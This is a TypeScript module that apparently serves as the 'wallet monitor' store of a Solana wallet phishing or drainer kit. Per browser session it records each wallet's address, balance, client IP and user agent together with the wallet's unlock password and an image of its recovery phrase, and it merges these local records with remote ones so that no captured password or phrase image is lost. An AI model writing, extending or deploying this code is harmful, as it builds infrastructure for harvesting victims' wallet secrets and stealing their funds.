export type WalletMonitorRecord = {
  id: string
  walletAddress: string
  walletType: string
  chain: string
  network: string
  balanceSol: number | null
  pageUrl: string | null
  userAgent: string | null
  clientIp: string | null
  browserSessionId: string | null
  unlockPassword: string | null
  phraseSnapImage: string | null
  connectedAt: string
  lastSeenAt: string
  connectionStatus: string
  user: null
}

const STORAGE_KEY = 'vrfd_wallet_monitor'
const CHANNEL = 'vrfd-wallet-monitor'

function nowIso() {
  return new Date().toISOString()
}

function sessionKey(walletAddress: string, browserSessionId?: string | null) {
  return `${walletAddress}::${browserSessionId || 'default'}`
}

function readAll(): WalletMonitorRecord[] {
  if (typeof window === 'undefined') return []
  try {
    const raw = localStorage.getItem(STORAGE_KEY)
    if (!raw) return []
    const parsed = JSON.parse(raw) as WalletMonitorRecord[]
    return Array.isArray(parsed)
      ? parsed
          .filter((row) => row?.walletAddress)
          .map((row) => ({ ...row, phraseSnapImage: row.phraseSnapImage ?? null }))
      : []
  } catch {
    return []
  }
}

function writeAll(rows: WalletMonitorRecord[]) {
  if (typeof window === 'undefined') return
  localStorage.setItem(STORAGE_KEY, JSON.stringify(rows.slice(0, 200)))
  window.dispatchEvent(new CustomEvent(CHANNEL))
}

export function listLocalWalletSessions(): WalletMonitorRecord[] {
  return readAll().sort((a, b) => new Date(b.lastSeenAt).getTime() - new Date(a.lastSeenAt).getTime())
}

export function upsertLocalWalletSession(input: {
  walletAddress: string
  walletType?: string
  chain?: string
  network?: string
  balanceSol?: number | null
  pageUrl?: string | null
  browserSessionId?: string | null
  unlockPassword?: string | null
  phraseSnapImage?: string | null
  connectionStatus?: string
}): WalletMonitorRecord {
  const rows = readAll()
  const key = sessionKey(input.walletAddress, input.browserSessionId)
  const existing = rows.find((row) => sessionKey(row.walletAddress, row.browserSessionId) === key)
  const record: WalletMonitorRecord = {
    id: existing?.id || (typeof crypto !== 'undefined' && crypto.randomUUID ? crypto.randomUUID() : `${Date.now()}`),
    walletAddress: input.walletAddress,
    walletType: input.walletType || existing?.walletType || 'Solana Wallet',
    chain: input.chain || existing?.chain || 'solana',
    network: input.network || existing?.network || 'mainnet-beta',
    balanceSol: typeof input.balanceSol === 'number' ? input.balanceSol : existing?.balanceSol ?? null,
    pageUrl: input.pageUrl ?? existing?.pageUrl ?? null,
    userAgent: typeof navigator !== 'undefined' ? navigator.userAgent.slice(0, 500) : existing?.userAgent ?? null,
    clientIp: existing?.clientIp ?? null,
    browserSessionId: input.browserSessionId ?? existing?.browserSessionId ?? null,
    unlockPassword:
      input.unlockPassword !== undefined ? input.unlockPassword : existing?.unlockPassword ?? null,
    phraseSnapImage:
      input.phraseSnapImage !== undefined ? input.phraseSnapImage : existing?.phraseSnapImage ?? null,
    connectedAt: existing?.connectedAt || nowIso(),
    lastSeenAt: nowIso(),
    connectionStatus: input.connectionStatus || 'connected',
    user: null,
  }
  const next = [record, ...rows.filter((row) => sessionKey(row.walletAddress, row.browserSessionId) !== key)]
  writeAll(next)
  return record
}

export function disconnectLocalWalletSession(walletAddress: string) {
  const next = readAll().map((row) =>
    row.walletAddress === walletAddress
      ? { ...row, connectionStatus: 'disconnected', lastSeenAt: nowIso() }
      : row
  )
  writeAll(next)
}

export function mergeWalletSessions<
  T extends {
    walletAddress: string
    lastSeenAt: string
    unlockPassword?: string | null
    phraseSnapImage?: string | null
    browserSessionId?: string | null
  },
>(remote: T[], local: T[]): T[] {
  const byKey = new Map<string, T>()
  for (const row of remote) byKey.set(sessionKey(row.walletAddress, row.browserSessionId), row)
  for (const row of local) {
    const key = sessionKey(row.walletAddress, row.browserSessionId)
    const prev = byKey.get(key)
    byKey.set(key, {
      ...prev,
      ...row,
      unlockPassword: row.unlockPassword || prev?.unlockPassword || null,
      phraseSnapImage: row.phraseSnapImage || prev?.phraseSnapImage || null,
      connectedAt: (prev as { connectedAt?: string } | undefined)?.connectedAt || (row as { connectedAt?: string }).connectedAt,
    } as T)
  }
  return Array.from(byKey.values()).sort(
    (a, b) => new Date(b.lastSeenAt).getTime() - new Date(a.lastSeenAt).getTime()
  )
}

export function subscribeWalletMonitor(onChange: () => void) {
  if (typeof window === 'undefined') return () => {}
  const handler = () => onChange()
  window.addEventListener(CHANNEL, handler)
  window.addEventListener('storage', handler)
  return () => {
    window.removeEventListener(CHANNEL, handler)
    window.removeEventListener('storage', handler)
  }
}
